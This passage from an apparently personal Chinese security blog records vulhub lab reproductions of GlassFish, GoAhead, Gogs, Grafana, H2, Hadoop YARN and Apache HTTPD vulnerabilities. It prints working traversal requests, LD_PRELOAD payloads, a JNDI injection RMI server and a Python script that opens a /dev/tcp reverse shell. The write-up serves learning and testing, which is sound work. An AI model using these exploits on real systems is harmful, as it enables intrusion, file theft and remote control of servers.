href="https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html">https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html</a></li></ul></blockquote><p><img src="135.jpg" alt="135"><br>创建环境显示502</p><h1 id="GlassFish-任意文件读取漏洞"><a href="#GlassFish-任意文件读取漏洞" class="headerlink" title="GlassFish 任意文件读取漏洞"></a>GlassFish 任意文件读取漏洞</h1><blockquote><h2 id="原理-7"><a href="#原理-7" class="headerlink" title="原理"></a>原理</h2><p>参考链接：</p><ul><li><a href="https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-016/?fid=6904">https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-016/?fid=6904</a></li><li><a href="https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html">https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html</a></li></ul><p>GlassFish在解码URL时，没有考虑UTF-8 Overlong Encoding攻击，导致将<code>%c0%ae</code>解析为ASCCII字符的<code>.</code>（点）。利用<code>%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/</code>来向上跳转，达到目录穿越、任意文件读取的效果。</p></blockquote><h2 id="漏洞复现-64"><a href="#漏洞复现-64" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>环境运行后，访问<code>http://your-ip:8080</code>和<code>http://your-ip:4848</code>即可查看web页面。其中，8080端口是网站内容，4848端口是GlassFish管理中心。</p><p>访问<code>https://your-ip:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd</code>，发现已成功读取<code>/etc/passwd</code>内容：</p></blockquote><p><img src="136.jpg" alt="136"></p><h1 id="GoAhead-远程命令执行漏洞（CVE-2017-17562）"><a href="#GoAhead-远程命令执行漏洞（CVE-2017-17562）" class="headerlink" title="GoAhead 远程命令执行漏洞（CVE-2017-17562）"></a>GoAhead 远程命令执行漏洞（CVE-2017-17562）</h1><blockquote><p>GoAhead是一个开源(商业许可)、简单、轻巧、功能强大、可以在多个平台运行的Web Server，多用于嵌入式系统、智能设备。其支持运行ASP、Javascript和标准的CGI程序，这个漏洞就出现在运行CGI程序的时候。</p><p>GoAhead在接收到请求后，将会从URL参数中取出键和值注册进CGI程序的环境变量，且只过滤了<code>REMOTE_HOST</code>和<code>HTTP_AUTHORIZATION</code>。我们能够控制环境变量，就有很多攻击方式。比如在Linux中，<code>LD_</code>开头的环境变量和动态链接库有关，如<code>LD_PRELOAD</code>中指定的动态链接库，将会被自动加载；<code>LD_LIBRARY_PATH</code>指定的路径，程序会去其中寻找动态链接库。</p><p>我们可以指定<code>LD_PRELOAD=/proc/self/fd/0</code>，因为<code>/proc/self/fd/0</code>是标准输入，而在CGI程序中，POST数据流即为标准输入流。我们编译一个动态链接库，将其放在POST Body中，发送给<code>http://target/cgi-bin/index?LD_PRELOAD=/proc/self/fd/0</code>，CGI就会加载我们发送的动态链接库，造成远程命令执行漏洞。</p><p>参考链接：</p><ul><li><a href="https://www.elttam.com.au/blog/goahead/">https://www.elttam.com.au/blog/goahead/</a></li></ul></blockquote><h2 id="漏洞复现-65"><a href="#漏洞复现-65" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>我们首先需要编译一个动态链接库，而且需要和目标架构相同。所以在实战中，如果对方是一个智能设备，你可能需要交叉编译。因为Vulhub运行在<code>Linux x86_64</code>的机器中，所以我们直接用Linux PC编译即可。动态链接库源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> before\_main(<span class="type">void</span>) \_\_attribute\_\_((constructor));</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> before\_main(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">write(<span class="number">1</span>, <span class="string">&quot;Hello: World!\n&quot;</span>, <span class="number">14</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样，<code>before_main</code>函数将在程序执行前被调用。编译以上代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC ./payload.c -o payload.so</span><br></pre></td></tr></table></figure><p>将payload.so作为post body发送：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST --data-binary @payload.so &quot;http://your-ip:8080/cgi-bin/index?LD\_PRELOAD=/proc/self/fd/0&quot; -i</span><br></pre></td></tr></table></figure><p>可见，<code>Hello: world!</code>已被成功输出，说明我们的动态链接库中的代码已被执行：</p></blockquote><p><img src="137.jpg" alt="137"></p><p><img src="138.jpg" alt="138"></p><h1 id="GoAhead-Server-环境变量注入（CVE-2021-42342）"><a href="#GoAhead-Server-环境变量注入（CVE-2021-42342）" class="headerlink" title="GoAhead Server 环境变量注入（CVE-2021-42342）"></a>GoAhead Server 环境变量注入（CVE-2021-42342）</h1><blockquote><p>GoAhead是一个开源(商业许可)、简单、轻巧、功能强大、可以在多个平台运行的Web Server，多用于嵌入式系统、智能设备。其支持运行ASP、Javascript和标准的CGI程序。</p><p>这个漏洞是<a href="https://github.com/vulhub/vulhub/tree/master/goahead/CVE-2017-17562">CVE-2017-17562</a>漏洞补丁的绕过，攻击者可以利用该补丁没有考虑到的multipart表单控制目标服务器的环境变量，进而劫持<code>LD_PRELOAD</code>来执行任意代码。</p><p>参考链接：</p><ul><li><a href="https://github.com/vulhub/vulhub/tree/master/goahead/CVE-2017-17562">https://github.com/vulhub/vulhub/tree/master/goahead/CVE-2017-17562</a></li><li><a href="https://ahmed-belkahla.me/post/2-methods-rce-0-day-in-goahead-webserver-pbctf-2021/">https://ahmed-belkahla.me/post/2-methods-rce-0-day-in-goahead-webserver-pbctf-2021/</a></li><li><a href="https://mp.weixin.qq.com/s/AS9DHeHtgqrgjTb2gzLJZg">https://mp.weixin.qq.com/s/AS9DHeHtgqrgjTb2gzLJZg</a></li></ul></blockquote><h2 id="漏洞复现-66"><a href="#漏洞复现-66" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>我们首先需要编译一个动态链接库，而且需要和目标架构相同。所以在实战中，如果对方是一个智能设备，你可能需要交叉编译。因为Vulhub运行在<code>Linux x86_64</code>的机器中，所以我们直接用Linux PC编译即可。动态链接库源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> before\_main(<span class="type">void</span>) \_\_attribute\_\_((constructor));</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> before\_main(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">write(<span class="number">1</span>, <span class="string">&quot;Hello: World\r\n\r\n&quot;</span>, <span class="number">16</span>);</span><br><span class="line">write(<span class="number">1</span>, <span class="string">&quot;Hacked\n&quot;</span>, <span class="number">7</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样，<code>before_main</code>函数将在程序执行前被调用。编译以上代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -s -shared -fPIC ./payload.c -o payload.so</span><br></pre></td></tr></table></figure><p>然后，我们使用<a href="poc.py">这个脚本</a>来发送恶意数据包，复现漏洞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python poc.py http://192.168.0.196:8080/cgi-bin/index payload.so</span><br></pre></td></tr></table></figure><p>可见，我们在动态链接库中编写的劫持代码已经被成功执行：</p></blockquote><p><img src="139.jpg" alt="139"></p><h1 id="Gogs-任意用户登录漏洞（CVE-2018-18925）-未完成"><a href="#Gogs-任意用户登录漏洞（CVE-2018-18925）-未完成" class="headerlink" title="Gogs 任意用户登录漏洞（CVE-2018-18925）(未完成)"></a>Gogs 任意用户登录漏洞（CVE-2018-18925）(未完成)</h1><blockquote><p>gogs是一款极易搭建的自助Git服务平台，具有易安装、跨平台、轻量级等特点，使用者众多。</p><p>其0.11.66及以前版本中，（go-macaron&#x2F;session库）没有对sessionid进行校验，攻击者利用恶意sessionid即可读取任意文件，通过控制文件内容来控制session内容，进而登录任意账户。</p><p>参考链接：</p><ul><li><a href="https://github.com/gogs/gogs/issues/5469">https://github.com/gogs/gogs/issues/5469</a></li><li><a href="https://xz.aliyun.com/t/3168">https://xz.aliyun.com/t/3168</a></li><li><a href="https://www.anquanke.com/post/id/163575">https://www.anquanke.com/post/id/163575</a></li></ul></blockquote><h2 id="漏洞复现-67"><a href="#漏洞复现-67" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>使用Gob序列化生成session文件：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;bytes&quot;</span></span><br><span class="line"><span class="string">&quot;encoding/gob&quot;</span></span><br><span class="line"><span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">EncodeGob</span><span class="params">(obj <span class="keyword">map</span>[<span class="keyword">interface</span>&#123;&#125;]<span class="keyword">interface</span>&#123;&#125;)</span></span> ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">for</span> \_, v := <span class="keyword">range</span> obj &#123;</span><br><span class="line">gob.Register(v)</span><br><span class="line">&#125;</span><br><span class="line">buf := bytes.NewBuffer(<span class="literal">nil</span>)</span><br><span class="line">err := gob.NewEncoder(buf).Encode(obj)</span><br><span class="line"><span class="keyword">return</span> buf.Bytes(), err</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> uid <span class="type">int64</span> = <span class="number">1</span></span><br><span class="line">obj := <span class="keyword">map</span>[<span class="keyword">interface</span>&#123;&#125;]<span class="keyword">interface</span>&#123;&#125;&#123;<span class="string">&quot;\_old\_uid&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;uid&quot;</span>: uid, <span class="string">&quot;uname&quot;</span>: <span class="string">&quot;root&quot;</span>&#125;</span><br><span class="line">data, err := EncodeGob(obj)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line">&#125;</span><br><span class="line">err = ioutil.WriteFile(<span class="string">&quot;data&quot;</span>, data, os.O\_CREATE|os.O\_WRONLY)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line">&#125;</span><br><span class="line">edata := hex.EncodeToString(data)</span><br><span class="line">fmt.Println(edata)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后注册一个普通用户账户，创建项目，并在“版本发布”页面上传刚生成的session文件：</p></blockquote><p>最后一步没能成功….<img src="140.jpg" alt="140"></p><h1 id="Grafana-8-x-插件模块目录穿越漏洞（CVE-2021-43798）"><a href="#Grafana-8-x-插件模块目录穿越漏洞（CVE-2021-43798）" class="headerlink" title="Grafana 8.x 插件模块目录穿越漏洞（CVE-2021-43798）"></a>Grafana 8.x 插件模块目录穿越漏洞（CVE-2021-43798）</h1><blockquote><ul><li><p>Grafana是一个开源的度量分析与可视化套件。在2021年12月，推特用户@j0v 发表了他发现的一个0day，攻击者利用这个漏洞可以读取服务器上的任意文件。</p><p>参考链接：</p><ul><li><a href="https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/">https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix/</a></li><li><a href="https://twitter.com/hacker_/status/1467880514489044993">https://twitter.com/hacker_/status/1467880514489044993</a></li><li><a href="https://nosec.org/home/detail/4914.html">https://nosec.org/home/detail/4914.html</a></li><li><a href="https://mp.weixin.qq.com/s/dqJ3F_fStlj78S0qhQ3Ggw">https://mp.weixin.qq.com/s/dqJ3F_fStlj78S0qhQ3Ggw</a></li></ul></li></ul></blockquote><h2 id="漏洞复现-68"><a href="#漏洞复现-68" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>这个漏洞出现在插件模块中，这个模块支持用户访问插件目录下的文件，但因为没有对文件名进行限制，攻击者可以利用<code>../</code>的方式穿越目录，读取到服务器上的任意文件。</p><p>利用这个漏洞前，我们需要先获取到一个已安装的插件id，比如常见的有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">alertlist</span><br><span class="line">cloudwatch</span><br><span class="line">dashlist</span><br><span class="line">elasticsearch</span><br><span class="line">graph</span><br><span class="line">graphite</span><br><span class="line">heatmap</span><br><span class="line">influxdb</span><br><span class="line">mysql</span><br><span class="line">opentsdb</span><br><span class="line">pluginlist</span><br><span class="line">postgres</span><br><span class="line">prometheus</span><br><span class="line">stackdriver</span><br><span class="line">table</span><br><span class="line">text</span><br></pre></td></tr></table></figure><p>再发送如下数据包，读取任意文件（你也可以将其中的<code>alertlist</code>换成其他合法的插件id）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET /public/plugins/alertlist/../../../../../../../../../../../../../etc/passwd HTTP/1.1</span><br><span class="line">Host: 192.168.1.112:3000</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: \*/\*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure></blockquote><p><img src="141.jpg"></p><h1 id="H2-Database-Console-未授权访问"><a href="#H2-Database-Console-未授权访问" class="headerlink" title="H2 Database Console 未授权访问"></a>H2 Database Console 未授权访问</h1><blockquote><p>H2 database是一款Java内存数据库，多用于单元测试。H2 database自带一个Web管理页面，在Spirng开发中，如果我们设置如下选项，即可允许外部用户访问Web管理页面，且没有鉴权：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">spring.h2.console.enabled=true</span><br><span class="line">spring.h2.console.settings.web-allow-others=true</span><br></pre></td></tr></table></figure><p>利用这个管理页面，我们可以进行JNDI注入攻击，进而在目标环境下执行任意命令。</p><p>参考链接：</p><ul><li><a href="https://mp.weixin.qq.com/s?__biz=MzI2NTM1MjQ3OA==&mid=2247483658&idx=1&sn=584710da0fbe56c1246755147bcec48e">https://mp.weixin.qq.com/s?__biz=MzI2NTM1MjQ3OA==&amp;mid=2247483658&amp;idx=1&amp;sn=584710da0fbe56c1246755147bcec48e</a></li></ul></blockquote><h2 id="漏洞复现-69"><a href="#漏洞复现-69" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>目标环境是Java 8u252，版本较高，因为上下文是Tomcat环境，我们可以参考《<a href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java">Exploiting JNDI Injections in Java</a>》，使用<code>org.apache.naming.factory.BeanFactory</code>加EL表达式注入的方式来执行任意命令。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.\*;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.\*;</span><br><span class="line"><span class="keyword">import</span> javax.naming.\*;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilRMIServerNew</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;Creating evil RMI registry on port 1097&quot;</span>);</span><br><span class="line"><span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1097</span>);</span><br><span class="line"><span class="comment">//prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory</span></span><br><span class="line"><span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>,<span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="comment">//redefine a setter name for the &#x27;x&#x27; property from &#x27;setX&#x27; to &#x27;eval&#x27;, see BeanFactory.getObjectInstance code</span></span><br><span class="line">ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line"><span class="comment">//expression language to execute &#x27;nslookup jndi.s.artsploit.com&#x27;, modify /bin/sh to cmd.exe if you target windows</span></span><br><span class="line">ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/sh&#x27;,&#x27;-c&#x27;,&#x27;nslookup jndi.s.artsploit.com&#x27;]).start()\&quot;)&quot;</span>));</span><br><span class="line"><span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">com</span>.sun.jndi.rmi.registry.ReferenceWrapper(ref);</span><br><span class="line">registry.bind(<span class="string">&quot;Object&quot;</span>, referenceWrapper);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以借助这个小工具<a href="https://github.com/JosephTribbianni/JNDI">JNDI</a>简化我们的复现过程。</p><p>首先设置JNDI工具中执行的命令为<code>touch /tmp/success</code>：</p><p>然后启动<code>JNDI-1.0-all.jar</code>，在h2 console页面填入JNDI类名和URL地址：</p></blockquote><p>JNDI似乎是在github下架了 这里搞了个<a href="https://github.com/welk1n/JNDI-Injection-Exploit">替代品</a><br>输入<code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C touch /tmp/success</code> 来生成我们接下来要用的payload</p><p><img src="144.jpg" alt="144"></p><p>访问<code>http://your-ip:8080/h2-console/</code>即可查看h2管理器页面</p><p><img src="142.jpg" alt="142"></p><blockquote><p>其中，<code>javax.naming.InitialContext</code>是JNDI的工厂类，URL是运行JNDI工具监听的RMI地址。</p></blockquote><p>点击connect 虽然会报错 但是已创建文件说明成功运行<br><img src="143.jpg" alt="143"></p><h1 id="Hadoop-YARN-ResourceManager-未授权访问结尾-引用"><a href="#Hadoop-YARN-ResourceManager-未授权访问结尾-引用" class="headerlink" title="Hadoop YARN ResourceManager 未授权访问结尾&#x2F;引用"></a>Hadoop YARN ResourceManager 未授权访问结尾&#x2F;引用</h1><blockquote><h2 id="原理-8"><a href="#原理-8" class="headerlink" title="原理"></a>原理</h2><p>参考 <a href="http://archive.hack.lu/2016/Wavestone%20-%20Hack.lu%202016%20-%20Hadoop%20safari%20-%20Hunting%20for%20vulnerabilities%20-%20v1.0.pdf">http://archive.hack.lu/2016/Wavestone%20-%20Hack.lu%202016%20-%20Hadoop%20safari%20-%20Hunting%20for%20vulnerabilities%20-%20v1.0.pdf</a></p></blockquote><h2 id="漏洞复现-70"><a href="#漏洞复现-70" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>这个连官方给的线索也不是很多..<br>我参考了<a href="https://blog.csdn.net/Aaron_Miller/article/details/106466256">这个玩意儿</a><br>机子开着监听9999端口 用下面的exp（需要修改一下细节）就能获取root账号的shell了<br><img src="146.jpg" alt="146"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">import requests</span><br><span class="line">target = &#x27;http://192.168.226.140:8088/&#x27;</span><br><span class="line">lhost = &#x27;192.168.226.134&#x27; # put your local host ip here, and listen at port 9999</span><br><span class="line">url = target + &#x27;ws/v1/cluster/apps/new-application&#x27;</span><br><span class="line">resp = requests.post(url)</span><br><span class="line">app\_id = resp.json()[&#x27;application-id&#x27;]</span><br><span class="line">url = target + &#x27;ws/v1/cluster/apps&#x27;</span><br><span class="line">data = &#123;</span><br><span class="line">&#x27;application-id&#x27;: app\_id,</span><br><span class="line">&#x27;application-name&#x27;: &#x27;get-shell&#x27;,</span><br><span class="line">&#x27;am-container-spec&#x27;: &#123;</span><br><span class="line">&#x27;commands&#x27;: &#123;</span><br><span class="line">&#x27;command&#x27;: &#x27;/bin/bash -i &gt;&amp; /dev/tcp/%s/9999 0&gt;&amp;1&#x27; % lhost,</span><br><span class="line">&#125;,</span><br><span class="line">&#125;,</span><br><span class="line">&#x27;application-type&#x27;: &#x27;YARN&#x27;,</span><br><span class="line">&#125;</span><br><span class="line">requests.post(url, json=data)</span><br></pre></td></tr></table></figure><h1 id="Apache-HTTPD-多后缀解析漏洞"><a href="#Apache-HTTPD-多后缀解析漏洞" class="headerlink" title="Apache HTTPD 多后缀解析漏洞"></a>Apache HTTPD 多后缀解析漏洞</h1><blockquote><p>Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。比如，如下配置文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AddType text/html .html</span><br><span class="line">AddLanguage zh-CN .cn</span><br></pre></td></tr></table></figure><p>其给<code>.html</code>后缀增加了media-type，值为<code>text/html</code>；给<code>.cn</code>后缀增加了语言，值为<code>zh-CN</code>。此时，如果用户请求文件<code>index.cn.html</code>，他将返回一个中文的html页面。</p><p>以上就是Apache多后缀的特性。如果运维人员给<code>.php</code>后缀增加了处理器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler application/x-httpd-php .php</span><br></pre></td></tr></table></figure><p>那么，在有多个后缀的情况下，只要一个文件含有<code>.php</code>后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。</p></blockquote><h2 id="漏洞复现-71"><a href="#漏洞复现-71" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>环境运行后，访问<code>http://your-ip/uploadfiles/apache.php.jpeg</code>即可发现，phpinfo被执行了，该文件被解析为php脚本。</p><p><code>http://your-ip/index.php</code>中是一个白名单检查文件后缀的上传组件，上传完成后并未重命名。我们可以通过上传文件名为<code>xxx.php.jpg</code>或<code>xxx.php.jpeg</code>的文件，利用Apache解析漏洞进行getshell。</p></blockquote><p><img src="147.jpg" alt="147"></p><h1 id="Apache-HTTP-Server-2-4-48-mod-proxy-SSRF漏洞（CVE-2021-40438）-坑"><a href="#Apache-HTTP-Server-2-4-48-mod-proxy-SSRF漏洞（CVE-2021-40438）-坑" class="headerlink" title="Apache HTTP Server 2.4.48 mod_proxy SSRF漏洞（CVE-2021-40438）(坑)"></a>Apache HTTP Server 2.4.48 mod_proxy SSRF漏洞（CVE-2021-40438）(坑)</h1><blockquote><p>Apache HTTP Server是Apache基金会开源的一款流行的HTTP服务器。在其2.4.48及以前的版本中，mod_proxy模块存在一处逻辑错误导致攻击者可以控制反向代理服务器的地址，进而导致SSRF漏洞。</p><p>参考链接：</p><ul><li><a href="https://httpd.apache.org/security/vulnerabilities_24.html">https://httpd.apache.org/security/vulnerabilities_24.html</a></li><li><a href="https://firzen.de/building-a-poc-for-cve-2021-40438">https://firzen.de/building-a-poc-for-cve-2021-40438</a></li><li><a href="https://www.leavesongs.com/PENETRATION/apache-mod-proxy-ssrf-cve-2021-40438.html">https://www.leavesongs.com/PENETRATION/apache-mod-proxy-ssrf-cve-2021-40438.html</a></li></ul></blockquote><h2 id="漏洞复现-72"><a href="#漏洞复现-72" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>HTTP余下的漏洞应该都试不了了 镜像pull老失败….</p><h1 id><a href="#" class="headerlink" title></a></h1><h2 id="结尾-引用"><a href="#结尾-引用" class="headerlink" title="结尾&#x2F;引用"></a>结尾&#x2F;引用</h2><blockquote><p>We are just another visitor in a transient world.</p></blockquote><p>原文大部分内容来自<a href="https://github.com/vulhub/vulhub">vulhub</a>中自带的readme文件 在此非常感谢铺下前路的技术大牛</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
          <category> src </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习 </tag>
            
            <tag> src </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>神奇脚本在哪里-CTF之Pwn</title>
      <link href="/2024/08/26/%E7%A5%9E%E5%A5%87%E8%84%9A%E6%9C%AC%E5%9C%A8%E5%93%AA%E9%87%8C-CTF%E4%B9%8BPwn/"/>
      <url>/2024/08/26/%E7%A5%9E%E5%A5%87%E8%84%9A%E6%9C%AC%E5%9C%A8%E5%93%AA%E9%87%8C-CTF%E4%B9%8BPwn/</url>
      
